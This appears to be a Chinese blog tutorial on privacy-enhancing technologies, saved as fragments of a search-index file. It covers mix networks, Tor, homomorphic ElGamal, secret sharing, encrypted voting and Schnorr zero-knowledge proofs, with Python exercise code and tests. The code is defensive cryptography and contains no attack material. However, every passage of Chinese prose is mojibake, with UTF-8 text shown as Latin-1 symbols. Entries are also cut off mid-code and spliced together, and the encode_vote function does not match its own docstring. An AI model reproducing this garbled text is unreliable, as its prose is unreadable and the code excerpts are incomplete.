ç”¨åŒ…ã€æ•…æ„ä¸¢åŒ…ç­‰æ‰‹æ®µæŠµæŠ—æµé‡åˆ†æï¼Œè¿™å°±æ˜¯é«˜å»¶è¿Ÿçš„ç”±æ¥ã€‚ å•ä¸ª Mix æ¥ä¸‹æ¥æ¥æ„å»ºè¿™æ ·çš„é»‘ç›’å­ï¼Œé¦–å…ˆæ˜¯ Mix Server éƒ¨åˆ†ï¼š def aes_ctr_enc_dec(key, iv, message): \"\"\" A helper function that implements AES Counter (CTR) Mode encryption and decryption. Expects a key (16 byte), and IV (16 bytes) and an input plaintext / ciphertext. If it is not obvious convince yourself that CTR encryption and decryption are in fact the same operations. \"\"\" aes = Cipher(\"AES-128-CTR\") enc = aes.enc(key, iv) output = enc.update(message) output += enc.finalize() return output # This is the type of messages destined for the one-hop mix OneHopMixMessage = namedtuple('OneHopMixMessage', ['ec_public_key', 'hmac', 'address', 'message']) def mix_server_one_hop(private_key, message_list): \"\"\" Implements the decoding for a simple one-hop mix. Each message is decoded in turn: - A shared key is derived from the message public key and the mix private_key. - the hmac is checked against all encrypted parts of the message - the address and message are decrypted, decoded and returned \"\"\" G = EcGroup() out_queue = [] # Process all messages for msg in message_list: # Check elements and lengths if not G.check_point(msg.ec_public_key) or \\ not len(msg.hmac) == 20 or \\ not len(msg.address) == 258 or \\ not len(msg.message) == 1002: raise Exception(\"Malformed input message\") # First get a shared key shared_element = private_key * msg.ec_public_key key_material = sha512(shared_element.export()).digest() # Use different parts of the shared key for different operations hmac_key = key_material[:16] address_key = key_material[16:32] message_key = key_material[32:48] # Check the HMAC h = Hmac(b\"sha512\", hmac_key) h.update(msg.address) h.update(msg.message) expected_mac = h.digest() if not secure_compare(msg.hmac, expected_mac[:20]): raise Exception(\"HMAC check failure\") # Decrypt the address and the message iv = b\"\\x00\" * 16 address_plaintext = aes_ctr_enc_dec(address_key, iv, msg.address) message_plaintext = aes_ctr_enc_dec(message_key, iv, msg.message) # Decode the address and message address_len, address_full = unpack(\"!H256s\", address_plaintext) message_len, message_full = unpack(\"!H1000s\", message_plaintext) output = (address_full[:address_len], message_full[:message_len]) out_queue += [output] return sorted(out_queue) æ ¹æ® Mix Server é€»è¾‘ç¼–å†™ Mix Client çš„é€»è¾‘ï¼š def mix_client_one_hop(public_key, address, message): \"\"\" Encode a message to travel through a single mix with a set public key. The maximum size of the final address and the message are 256 bytes and 1000 bytes respectively. Returns an 'OneHopMixMessage' with four parts: a public key, an HMAC (20 bytes), an address ciphertext (256 + 2 bytes) and a message ciphertext (1002 bytes). \"\"\" G = EcGroup() assert G.check_point(public_key) assert isinstance(address, bytes) and len(address) \u003c= 256 assert isinstance(message, bytes) and len(message) \u003c= 1000 # Encode the address and message # Use those as the payload for encryption address_plaintext = pack(\"!H256s\", len(address), address) message_plaintext = pack(\"!H1000s\", len(message), message) # Generate a fresh public key private_key = G.order().random() client_public_key = private_key * G.generator() # First get a shared key shared_element = private_key * public_key # client's priv and mix's pub key_material = sha512(shared_element.export()).digest() # Use different parts of the shared key for different operations hmac_key = key_material[:16] address_key = key_material[16:32] message_key = key_material[32:48] # Encrypt the address and the message iv = b\"\\x00\"*16 address_cipher = aes_ctr_e","date":"2022-02-04","objectID":"/pet/:4:1","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"ä½å»¶è¿ŸåŒ¿åé€šä¿¡ ä¹Ÿå°±æ˜¯ Onion è·¯ç”±ï¼Œæœ€è‘—åçš„ä¾‹å­æ˜¯ Tor ç½‘ç»œã€‚å¦‚æœ Alice è¦å‘é€æ¶ˆæ¯ç»™ Bobï¼Œé‚£ä¹ˆ Alice ä¼šé€‰æ‹© 3 ä¸ª Tor èŠ‚ç‚¹ï¼Œå°†æ¶ˆæ¯ç»ç”±è¿™ 3 ä¸ªèŠ‚ç‚¹å‘é€åˆ° Bobï¼Œè¿™æ ·ä»»æ„èŠ‚ç‚¹éƒ½ä¸çŸ¥é“æ¶ˆæ¯æ˜¯ä» Alice åˆ° Bob çš„ã€‚ ä¸Šè¿°æ–¹æ³•æä¾›äº†å‘é€è€…åŒ¿åæ€§ï¼Œä½†éœ€è¦ Alice çŸ¥é“ Bob èº«ä»½ã€‚å¦‚æœè¦åŒå‘åŒ¿åï¼Œåˆ™éœ€è¦ 6 ä¸ª Tor èŠ‚ç‚¹ï¼Œä¸¤è¾¹å¯¹ç§°ã€‚ Tor èŠ‚ç‚¹å°† IPã€å…¬é’¥ç­‰ä¿¡æ¯å…¬å¼€åˆ° Directory Authorities ä¸Šï¼Œåè€…åˆ™ç”Ÿæˆä¸€ä¸ª Consensus ä¾› Tor å®¢æˆ·ç«¯ä¸‹è½½ï¼Œä»è€Œè·å– Tor èŠ‚ç‚¹çš„ä¿¡æ¯ã€‚ å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œä¾ç„¶å¯ä»¥ç”¨ç±»ä¼¼ä¾§ä¿¡é“çš„æ–¹å¼æ”»å‡» Onion è·¯ç”±ã€‚ä¸€ç§æ–¹æ³•æ˜¯å°†è¾“å…¥å’Œè¾“å‡ºæ”¾åˆ°æ¡¶ä¸­ï¼Œè®¡ç®—ä¸¤è€…å…³è”ï¼Œä½†æ¡¶çš„å­˜åœ¨ä¼šé™ä½ç²¾ç¡®åº¦ã€‚æ›´å¥½çš„æ–¹æ³•æ˜¯æ ¹æ®è¾“å…¥å’ŒåŒ…å»¶è¿Ÿçš„æ¦‚ç‡åˆ†å¸ƒæ„å»ºæ¨¡ç‰ˆï¼Œå¹¶ç”¨è¾“å‡ºå»åŒ¹é…æ¨¡ç‰ˆã€‚å› æ­¤ï¼Œä½å»¶è¿ŸåŒ¿åé€šä¿¡æ›´å®¹æ˜“å—åˆ°è¢«åŠ¨æ”»å‡»ã€‚ è€Œå¦‚æœæ”»å‡»è€…èƒ½æ§åˆ¶éƒ¨åˆ† Tor èŠ‚ç‚¹ï¼Œä¹Ÿä¸ä¸€å®šèƒ½æ§åˆ¶æŸæ¬¡é€šä¿¡çš„æ•´æ¡è·¯å¾„ã€‚å¦‚æœæ”»å‡»è€…æ§åˆ¶äº† Tor ç½‘ç»œä¸­çš„ c ä¸ªèŠ‚ç‚¹ï¼Œé‚£ä¹ˆæ•´æ¡è·¯å¾„è¢«æ§åˆ¶çš„æ¦‚ç‡ä¸º O(c^2)ï¼Œå› ä¸ºæ”»å‡»è€…å¿…é¡»æ§åˆ¶ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªèŠ‚ç‚¹æ‰è¡Œã€‚ ","date":"2022-02-04","objectID":"/pet/:4:2","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"éšç§å‹å¥½å‹è®¡ç®— Privacy-friendly Computation åœ¨å‰ä¸¤éƒ¨åˆ†ï¼Œæˆ‘ä»¬ä»‹ç»äº†å¦‚ä½•å‘ç¬¬ä¸‰æ–¹éšè—éšç§ä¿¡æ¯ï¼Œå¦‚é€šä¿¡å†…å®¹ã€èº«ä»½ç­‰ï¼Œå¹¶ä¸”å·²ç»æœ‰ç±»ä¼¼ TLS å’Œ Tor è¿™ç±»æˆç†Ÿçš„è§£å†³æ–¹æ¡ˆã€‚ä½†æ˜¯ï¼Œå¦‚æœæ˜¯è¦å‘é€šä¿¡çš„å¯¹æ–¹éšè—ä¿¡æ¯å‘¢ï¼Ÿ ä¾‹å¦‚ï¼Œæˆ‘ä»¬æƒ³è®¡ç®— $y=f(x_1,â€¦,x_n)$ï¼Œå…¶ä¸­æ¶‰åŠçš„è¾“å…¥ $x_i$ æ¥è‡ª n ä¸ªä¸åŒçš„ä¸»ä½“ï¼Œå¹¶ä¸”æ¯ä¸ªä¸»ä½“éƒ½ä¸å¸Œæœ›åˆ«äººçŸ¥é“è‡ªå·±çš„ $x_i$ã€‚æœ€ç®€å•çš„åŠæ³•æ˜¯å¼•å…¥å¯ä¿¡ç¬¬ä¸‰æ–¹ï¼ˆTTPï¼‰æ¥è®¡ç®— yï¼Œç„¶è€Œä¸”ä¸è®º TTP æœªå¿…å­˜åœ¨ï¼Œæˆ‘ä»¬å¿…é¡»å¾—è€ƒè™‘ 4C é—®é¢˜ï¼š Costï¼šTTP è¦èŠ±å¤šå°‘é’±ï¼Ÿ Corruptionï¼šTTP çœŸçš„å¯ä¿¡å—ï¼Ÿ Compulsionï¼šTTP æœ‰æ²¡æœ‰å¯èƒ½å—åˆ°ä¸å¯æŠ—åŠ›å½±å“ï¼ˆå¦‚æ³•å¾‹ï¼‰æ³„éœ²éšç§ï¼Ÿ Compromiseï¼šTTP æœ‰æ²¡æœ‰å¯èƒ½è¢«å…¥ä¾µä»è€Œæ³„éœ²éšç§ï¼Ÿ å¯ä»¥çœ‹åˆ°ï¼Œå¯„å¸Œæœ›äº TTP å¹¶ä¸æ˜æ™ºï¼Œä¸è¿‡è¿™å¯ä»¥ä½œä¸ºä¸€ä¸ªå¾ˆå¥½çš„æ¯”è¾ƒæ ‡å‡†ï¼Œå³æˆ‘ä»¬è®¾è®¡çš„æ–¹æ¡ˆåº”å°½å¯èƒ½æ¥è¿‘å¼•å…¥ TTP æ‰€èƒ½è¾¾åˆ°çš„æ•ˆæœã€‚ ","date":"2022-02-04","objectID":"/pet/:5:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"åŒæ€åŠ å¯† ä¸€ç§æ–¹æ³•æ˜¯åŒæ€åŠ å¯†ï¼Œå³å¯¹å¯†æ–‡çš„è¿ç®—ç­‰åŒäºå¯¹æ˜æ–‡çš„è¿ç®—ï¼Œæ­¤æ—¶å¯ä»¥åœ¨ä¸çŸ¥é“æ˜æ–‡çš„æƒ…å†µä¸‹è®¡ç®—å‡ºç»è¿‡è¿ç®—çš„æ˜æ–‡æ‰€å¯¹åº”çš„å¯†æ–‡ã€‚ä»¥ ElGamal ä¸ºä¾‹ï¼Œæˆ‘ä»¬é€‰æ‹©ç¾¤ $G$ ä¸­çš„ä¸¤ä¸ªå…ƒç´  $g,h$ï¼Œéšæœºç”Ÿæˆ $x\\in(0,ord(G))$ ä½œä¸ºç§é’¥ï¼Œé‚£ä¹ˆå…¬é’¥å°±æ˜¯ $g^x$ã€‚éšåå†é€‰æ‹©éšæœºçš„ $k\\in(0,ord(G))$ï¼Œè®¡ç®—å¯†æ–‡ $E(m,k)=(g^k,g^{xk}h^m)$ã€‚ è§£å¯†æ—¶ï¼Œå¯¹äºå¯†æ–‡ $(a,b)$ï¼Œåªéœ€è®¡ç®— $m=log_h(b(a^x)^{-1})$ã€‚ç„¶è€Œç¦»æ•£å¯¹æ•°é—®é¢˜æ˜¯å›°éš¾çš„ï¼Œå› æ­¤å¯ä»¥å…ˆç¦»çº¿è®¡ç®—ä¸€å¼  $log_h$ è¡¨æ ¼ï¼ˆè¿™å°±è¦æ±‚æ˜æ–‡ç©ºé—´ä¸èƒ½å¤ªå¤§ï¼‰ã€‚æ­£ç¡®æ€§æ˜“è¯ï¼ŒåŒæ€æ€§åˆ™åŒ…å«åŠ æ³•å’Œå¸¸æ•°ä¹˜æ³•åŒæ€ï¼š $$ E(m_0,k_0)=(a_0,b_0) $$ $$ E(m_1,k_1)=(a_1,b_1) $$ $$ E(m_0+m_1,k_0+k_1)=(a_0a_1,b_0b_1)=(g^{k0+k1},g^{x(k0+k1)}h^{m0+m1}) $$ $$ E(cm_0, ck_0)=((a_0)^c,(b_0)^c) $$ åªæ»¡è¶³å¸¸æ•°ä¹˜æ³•åŒæ€ï¼Œä¸æ»¡è¶³ä¹˜æ³•åŒæ€ã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åœ¨æ¤­åœ†æ›²çº¿ä¸Šå®ç° Elgamalã€‚éœ€è¦æ³¨æ„ä¸Šæ–‡æåˆ°çš„è¿ç®—é™é˜¶é—®é¢˜ï¼Œå…¬é’¥å˜æˆäº† $xg$ï¼Œå¯†æ–‡ä¸º $(kg,kxg+mh)$ï¼Œè§£å¯†æ—¶è®¡ç®— $log_h(b-xa)$ã€‚ @pytest.mark.task1 def test_encrypt(): params = setup() priv, pub = keyGen(params) assert encrypt(params, pub, 0) assert encrypt(params, pub, 10) assert encrypt(params, pub, -10) with raises(Exception) as excinfo: encrypt(params, pub, -1000) with raises(Exception) as excinfo: encrypt(params, pub, 1000) @pytest.mark.task1 def test_decrypt(): params = setup() priv, pub = keyGen(params) assert decrypt(params, priv, encrypt(params, pub, 0)) == 0 assert decrypt(params, priv, encrypt(params, pub, 2)) == 2 assert decrypt(params, priv, encrypt(params, pub, -2)) == -2 assert decrypt(params, priv, encrypt(params, pub, 99)) == 99 def setup(): \"\"\"Generates the Cryptosystem Parameters.\"\"\" G = EcGroup(nid=713) g = G.hash_to_point(b\"g\") h = G.hash_to_point(b\"h\") o = G.order() return G, g, h, o def keyGen(params): \"\"\" Generate a private / public key pair \"\"\" G, g, h, o = params priv = G.order().random() pub = priv * g return priv, pub def encrypt(params, pub, m): \"\"\" Encrypt a message under the public key \"\"\" if not -100 \u003c m \u003c 100: raise Exception(\"Message value to low or high.\") G, g, h, o = params k = o.random() # (g^k, (pub^k)*(h^m)) c = (k*g, k*pub + m*h) return c def isCiphertext(params, ciphertext): \"\"\" Check a ciphertext \"\"\" (G, g, h, o) = params ret = len(ciphertext) == 2 a, b = ciphertext ret \u0026= G.check_point(a) ret \u0026= G.check_point(b) return ret _logh = None def logh(params, hm): \"\"\" Compute a discrete log, for small number only \"\"\" global _logh G, g, h, o = params # Initialize the map of logh if _logh is None: _logh = {} for m in range(-1000, 1000): _logh[(m * h)] = m if hm not in _logh: raise Exception(\"No decryption found.\") return _logh[hm] def decrypt(params, priv, ciphertext): \"\"\" Decrypt a message using the private key \"\"\" assert isCiphertext(params, ciphertext) a, b = ciphertext # b * (a^priv)^(-1) hm = b - priv*a return logh(params, hm) éšåï¼Œç¼–å†™åŒæ€åŠ å¯†å‡½æ•°ï¼š @pytest.mark.task2 def test_add(): params = setup() priv, pub = keyGen(params) one = encrypt(params, pub, 1) two = encrypt(params, pub, 2) three = add(params, pub, one, two) assert decrypt(params, priv, three) == 3 # Try it for a range of numbers for x in range(-10, 10): Ex = encrypt(params, pub, x) E2x = add(params, pub, Ex, Ex) assert decrypt(params, priv, E2x) == 2 * x @pytest.mark.task2 def test_mul(): params = setup() priv, pub = keyGen(params) two = encrypt(params, pub, 2) three = mul(params, pub, two, 2) assert decrypt(params, priv, three) == 4 # Try it for a range of numbers for x in range(-10, 10): Ex = encrypt(params, pub, x) E2x = mul(params, pub, Ex, 20) assert decrypt(params, priv, E2x) == 20 * x def add(params, pub, c1, c2): \"\"\" Given two ciphertexts compute the ciphertext of the sum of their plaintexts. \"\"\" assert isCiphertext(params, c1) assert isCiphertext(params, c2) a1, b1 = c1 a2, b2 = c2 c3 = (a1+a2, b1+b2) return c3 def mul(params, pub, c1, alpha): \"\"\" Given a ciphertext compute the ciphertext of the product of the plaintext time alpha \"\"\" assert isCiphertext(params, c1) a1, b1 = c1 c3 = (alpha * a1, alpha * b1) return c3 ç°åœ¨ï¼Œæˆ‘ä»¬æ¥è§£å†³å¤šæ–¹å‚ä¸è®¡ç®—çš„é—®é¢˜ã€‚æˆ‘ä»¬æ ¹æ®å¤šæ–¹å…¬é’¥ï¼Œç”Ÿæˆå…¬å…±å…¬é’¥ã€‚åœ¨æ•´æ•°åŸŸè¡¨ç¤ºä¸º $g^{x_1+â€¦+x_n}$ï¼Œåœ¨æ¤­åœ†æ›²çº¿ä¸Šåˆ™æ˜¯ $x_1g+â€¦+x_ng$ã€‚ @pytest.mark.task3 def test_groupKey(): params = setup() (G, g, h, o) = params # Generate a group key priv1, pub1 = keyGen(params) priv2, pub2 = keyGen(params) pub = groupKey(params, [pub1, pub2]) # Check it is valid priv = (priv1 + priv2) % o assert decrypt(params, priv, encrypt(p","date":"2022-02-04","objectID":"/pet/:5:1","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"ç§˜å¯†åˆ†äº« ç§˜å¯†åˆ†äº«é‡‡ç”¨äº†å¦ä¸€ç§æ€è·¯ï¼Œå°†ç§˜å¯†æ‹†åˆ†æˆè‹¥å¹²ç¢ç‰‡æä¾›ç»™ä¸åŒ authoritiesï¼Œä»è€Œåœ¨é¿å… authorities å¾—çŸ¥ç§˜å¯†çš„åŒæ—¶ï¼Œèƒ½å¤Ÿè®© authorities è¿›è¡ŒååŒè®¡ç®—ã€‚è¿™ä¸ªâ€œååŒè®¡ç®—â€éƒ¨åˆ†å®é™…ä¸Šæ˜¯ä¾èµ–äºåŠ æ³•åŒæ€åŠ å¯†çš„ï¼Œä¾‹å¦‚æˆ‘ä»¬ç”¨ \u003ca\u003e è¡¨ç¤º a çš„ç¢ç‰‡é›†åˆï¼Œé‚£ä¹ˆ \u003ca+b\u003e=\u003ca\u003e+\u003cb\u003eï¼Œæ­¤æ—¶è®¡ç®—å‡ºçš„æ˜¯ä¸€ä¸ªæ–°çš„ç§˜å¯†çš„ä¸€ä¸ªç¢ç‰‡ã€‚åŠ å¸¸æ•°å’Œä¹˜å¸¸æ•°ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚ ä¸è¿‡ï¼Œå¦‚æœæ˜¯ç§˜å¯†ç¢ç‰‡ä¹‹é—´çš„ä¹˜æ³•å°±æ¯”è¾ƒå¤æ‚äº†ï¼Œè¿™éœ€è¦ä¸€äº›é¢„è®¡ç®—çš„å€¼ä»¥åŠ authorities ä¹‹é—´çš„äº¤äº’ã€‚ä¾‹å¦‚ï¼Œè¦è®¡ç®— \u003cx\u003e å’Œ \u003cy\u003e çš„ç§¯ï¼Œæˆ‘ä»¬éœ€è¦å…ˆé¢„è®¡ç®— \u003ca\u003e,\u003cb\u003e,\u003cc\u003e ä½¿å¾— \u003cc\u003e=\u003cab\u003eï¼Œå…¶ä¸­ \u003ca\u003e,\u003cb\u003e æ˜¯éšæœºçš„ï¼Œè¿™æ ·æ‰èƒ½éšè— \u003cx\u003e å’Œ \u003cy\u003eã€‚ æ¥ä¸‹æ¥ï¼Œè®¡ç®— \u003ce\u003e=\u003cx\u003e+\u003ca\u003eï¼Œ\u003cd\u003e=\u003cy\u003e+\u003cb\u003eï¼Œå…¬å¼€ \u003ce\u003e,\u003cd\u003e è·å¾— e,dã€‚æ­¤æ—¶æ–¹èƒ½è®¡ç®— \u003cz\u003e=\u003cxy\u003e=\u003cc\u003e-e\u003cb\u003e-d\u003ca\u003e+edã€‚ ç§˜å¯†åˆ†äº«ç›¸å¯¹äºåŒæ€åŠ å¯†çš„ä¼˜åŠ¿åœ¨äºå¯ä»¥åŠ å…¥æœºåˆ¶ç¡®ä¿å®Œæ•´æ€§ã€‚ä¼ ç»Ÿæ–¹æ³•æ˜¯ authorities è¿›è¡Œé›¶çŸ¥è¯†è¯æ˜ï¼Œè¡¨æ˜å…¶å…¬å¼€çš„å€¼æ˜¯åˆæ³•çš„ï¼Œä½†æ€§èƒ½å ªå¿§ã€‚SPDZ åˆ™å¼•å…¥ MAC å¹¶å°† MAC ä¹Ÿæ‹†æˆç¢ç‰‡ï¼Œå¹¶é€šè¿‡å¹¶è¡ŒéªŒè¯æé«˜æ€§èƒ½ï¼Œä½¿å¾—å®Œæ•´æ€§æ£€æŸ¥è¾ƒä¸ºå»‰ä»·ã€‚ ç»¼åˆæ¥çœ‹ï¼Œç§˜å¯†åˆ†äº«é¢å¤–å¢åŠ äº†ç½‘ç»œè´Ÿæ‹…ï¼Œè€ŒåŒæ€åŠ å¯†é¢å¤–å¢åŠ äº†è®¡ç®—è´Ÿæ‹…ï¼Œå¯¹äºå¤§è§„æ¨¡è®¡ç®—è€Œè¨€æ€»ä½“æ€§èƒ½è¾ƒå·®ã€‚ç›®å‰ä¸¤è€…éƒ½ä¾ç„¶å¤„äºç ”ç©¶é˜¶æ®µï¼Œå°šä¸æˆç†Ÿã€‚ ","date":"2022-02-04","objectID":"/pet/:5:2","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"ç§å¯†æŠ•ç¥¨ æœ€åæˆ‘ä»¬å®ç°ä¸€ä¸ªç§å¯†æŠ•ç¥¨çš„åœºæ™¯ï¼š @pytest.mark.task5 def test_poll(): votes = [1, 0, 1, 0, 1, 1, 0, 1, 1, 1] v0, v1 = simulate_poll(votes) assert v0 == 3 assert v1 == 7 æˆ‘ä»¬éœ€è¦åœ¨ä¸çŸ¥é“æ˜æ–‡çš„æƒ…å†µä¸‹ï¼Œç»Ÿè®¡ 0 å’Œ 1 çš„ä¸ªæ•°ã€‚é¦–å…ˆä¸º authorities ç”Ÿæˆå¯†é’¥å¯¹å¹¶ç”Ÿæˆå…¬å…±å…¬é’¥ï¼Œç”¨ encode_vote() æ¥åŠ å¯†æŠ•ç¥¨æƒ…å†µã€‚éšåè°ƒç”¨ process_votes() é’ˆå¯¹å¯†æ–‡ç»Ÿè®¡ä¸ªæ•°ï¼Œæœ€å partialDecrypt() è§£å¯†ä¸ªæ•°ä¿¡æ¯å¹¶è¿”å›ã€‚ def encode_vote(params, pub, vote): \"\"\" Given a vote 0 or 1 encode the vote as two ciphertexts representing the count of votes for zero and the votes for one.\"\"\" assert vote in [0, 1] v0, v1 = encrypt(params, pub, vote) return v0, v1 def process_votes(params, pub, encrypted_votes): \"\"\" Given a list of encrypted votes tally them to sum votes for zeros and votes for ones. \"\"\" assert isinstance(encrypted_votes, list) tv1 = encrypt(params, pub, 0) # 0 elem for c in encrypted_votes: tv1 = add(params, pub, tv1, c) total = len(encrypted_votes) # total + (-1)*tv1 tv0 = encrypt(params, pub, total) tv0 = add(params, pub, tv0, mul(params, pub, tv1, -1)) return tv0, tv1 def simulate_poll(votes): \"\"\" Simulates the full process of encrypting votes, tallying them, and then decrypting the total. \"\"\" # Generate parameters for the crypto-system params = setup() # Make keys for 3 authorities priv1, pub1 = keyGen(params) priv2, pub2 = keyGen(params) priv3, pub3 = keyGen(params) pub = groupKey(params, [pub1, pub2, pub3]) # Simulate encrypting votes encrypted_votes = [] for v in votes: encrypted_votes.append(encode_vote(params, pub, v)) # Tally the votes total_v0, total_v1 = process_votes(params, pub, encrypted_votes) # Simulate threshold decryption privs = [priv1, priv2, priv3] for priv in privs[:-1]: total_v0 = partialDecrypt(params, priv, total_v0) total_v1 = partialDecrypt(params, priv, total_v1) total_v0 = partialDecrypt(params, privs[-1], total_v0, True) total_v1 = partialDecrypt(params, privs[-1], total_v1, True) # Return the plaintext values return total_v0, total_v1 ","date":"2022-02-04","objectID":"/pet/:5:3","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"é›¶çŸ¥è¯†è¯æ˜ ZKP é›¶çŸ¥è¯†è¯æ˜ä¸­ï¼Œprover å‘ verifier è¯æ˜å…³äº secret çš„ä¸€ä¸ªå‘½é¢˜ï¼Œå¹¶ä¸”ä¸æ³„éœ²ä»»ä½• secret çš„ä¿¡æ¯ã€‚ä¸€ä¸ªå…¸å‹çš„ä¾‹å­å°±æ˜¯æ•°å­—ç­¾åï¼Œprover è¯æ˜ä»–æ‹¥æœ‰ç§é’¥è€Œä¸æ³„éœ²ç§é’¥ä¿¡æ¯ã€‚ ","date":"2022-02-04","objectID":"/pet/:6:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"Schnorr Identification åè®® å…¬å…±å‚æ•°ï¼šç¾¤ $G$ï¼Œ$q=ord(G)$ï¼Œç”Ÿæˆå…ƒ $g$ Prover æ‹¥æœ‰ç§é’¥ $x$ï¼Œå…¬é’¥ $pub=g^x$ã€‚é€‰æ‹©éšæœºçš„ $w$ï¼Œè®¡ç®— $W=g^w$ å‘é€ç»™ Verifier Verifier è¿”å›éšæœºçš„æŒ‘æˆ˜å€¼ $c$ Prover è®¡ç®— $r=w-cx\\ (mod\\ q)$ å‘é€ç»™ Verifier Verifier éªŒè¯ $g^r\\cdot pub^c=W$ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªåè®®æ˜¯å¦æ»¡è¶³é›¶çŸ¥è¯†è¯æ˜çš„å‡ æ¡æ€§è´¨ï¼š Completenessï¼šå³æ­£ç¡®æ€§ Integrity / Soundnessï¼šå³è¿™æ ·åšæ˜¯å¦å°±èƒ½è¯æ˜ Prover çœŸçš„çŸ¥é“ x Privacy / Zero-knowledgeï¼šå³è¿™æ ·åšæ˜¯å¦ä¼šæ³„éœ² x çš„ä¿¡æ¯ Completeness å¾ˆå®¹æ˜“è¯æ˜ï¼š$g^r\\cdot (g^x)^c=g^{w-cx}g^{cx}=g^w=W$ã€‚ ä¸ºäº†è¯æ˜ Soundnessï¼Œæˆ‘ä»¬å‡è®¾å¯èƒ½çš„æŒ‘æˆ˜å€¼åªæœ‰ä¸¤ä¸ªï¼š$c$ å’Œ $câ€™$ã€‚å¦‚æœè¦æˆåŠŸè¯æ˜ï¼ŒProver è¦ä»¥å¤§äºäºŒåˆ†ä¹‹ä¸€çš„æ¦‚ç‡ç»™å‡ºæ­£ç¡®çš„ $r$ æˆ– $râ€™$ï¼Œ$r=w-cx$ï¼Œ$râ€™=w-câ€™x$ã€‚ç„¶è€Œå¦‚æœ Prover ä¸çŸ¥é“ $x$ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªç­‰å¼å‡ä¸ºçº¿æ€§ç­‰å¼ä¸”æœ‰ä¸¤ä¸ªæœªçŸ¥æ•° $w$ å’Œ $x$ï¼Œæ­¤æ—¶ Prover ä¸å¯èƒ½ä»¥å¤§äºäºŒåˆ†ä¹‹ä¸€çš„æ¦‚ç‡ç»™å‡ºæ­£ç¡®ç­”æ¡ˆã€‚ Zero-knowledge çš„è¯æ˜æ–¹å¼åˆ™æ¯”è¾ƒå¥‡æ€ªã€‚æˆ‘ä»¬çœ‹åˆ°ä¸Šè¿°åè®®çš„ transcript æ˜¯ $(W,c,r)$ã€‚å‡å¦‚ä»»ä½•äººéƒ½èƒ½æ„é€ è¿™æ ·çš„ä¸‰å…ƒç»„ä½¿å¾—å…¶èƒ½é€šè¿‡ Verifier æ£€æŸ¥ï¼Œé‚£ä¹ˆè¿™å°±è¯´æ˜ $x$ çš„ä¿¡æ¯ä¸å¯èƒ½è¢«æ³„éœ²ï¼Œå› ä¸ºè¿™é‡Œæ ¹æœ¬æ²¡æœ‰ç”¨åˆ° $x$ã€‚è€Œè¦æ„é€ è¿™æ ·çš„ä¸‰å…ƒç»„ï¼Œåªéœ€è¦éšæœºé€‰æ‹© $râ€™â€™,câ€™â€™$ï¼Œè®¡ç®— $Wâ€™â€™=g^{râ€™â€™}pub^{câ€™â€™}$ï¼ˆæ³¨æ„ $pub=g^x$ æ˜¯å…¬é’¥ï¼Œå¹¶æ²¡æœ‰ç”¨åˆ° $x$ï¼‰ï¼Œé‚£ä¹ˆ $(Wâ€™â€™,câ€™â€™,râ€™â€™)$ å°±èƒ½é€šè¿‡æ£€æŸ¥ã€‚ ","date":"2022-02-04","objectID":"/pet/:6:1","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"æ‰‘æœ”è¿·ç¦»ï¼šéšç§å¢å¼ºæŠ€æœ¯å®è·µ","uri":"/pet/"},{"categories":["å¯†ç å­¦"],"content":"Fiat-Shamir å¯å‘å¼æŠ€æœ¯ å®é™…è¿ç”¨ä¸­æˆ‘ä»¬æ›´å¤šæ—¶å€™å¸Œæœ›èƒ½æœ‰ä¸€ç§éäº¤äº’å¼çš„é›¶çŸ¥è¯†è¯æ˜ï¼Œè€Œ Fiat-Shamir å¯å‘å¼æŠ€æœ¯å°±æ˜¯ä¸€ç§å°† Schnorr Identification åè®®è½¬åŒ–ä¸ºéäº¤äº’å¼çš„é€šæ³•ã€‚ å…¬å…±å‚æ•°ï¼šç¾¤ $G$ï¼Œ$q=ord(G)$ï¼Œç”Ÿæˆå…ƒ $g$ Prover æ‹¥æœ‰ç§é’¥ $x$ï¼Œå…¬é’¥ $pub=g^x$ã€‚é€‰æ‹©éšæœºçš„ $w$ï¼Œè®¡ç®— $W=g^w$ è®¡ç®— $c=H(pub,W,m)$ ï¼Œ$r=w-cx\\ (mod\\ q)$ï¼Œå‘é€ 